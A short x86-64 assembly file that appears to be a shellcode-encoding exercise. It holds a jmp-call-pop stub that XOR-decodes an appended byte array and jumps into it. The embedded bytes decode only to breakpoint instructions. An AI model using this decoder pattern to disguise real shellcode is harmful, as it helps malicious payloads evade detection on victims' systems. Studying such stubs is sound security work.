BITS 64

global _start

section .text

_start:
        jmp _load_shellcode
_real_start:
        pop r15         ; r15 hold the address of shellcode
        xor rax, rax
        mov rcx, rax
        add cl, 2
        mov eax, 0x06b08be6
        mov rbx, r15
        sub bl, 4
_loop:
        xor DWORD [rbx + rcx * 4], eax
        inc rax
        dec rax
        loop _loop
        jmp r15

_load_shellcode:
        call _real_start
shellcode: db 0x2a,0x47,0x7c,0xca,0x2a,0x47,0x7c,0xca
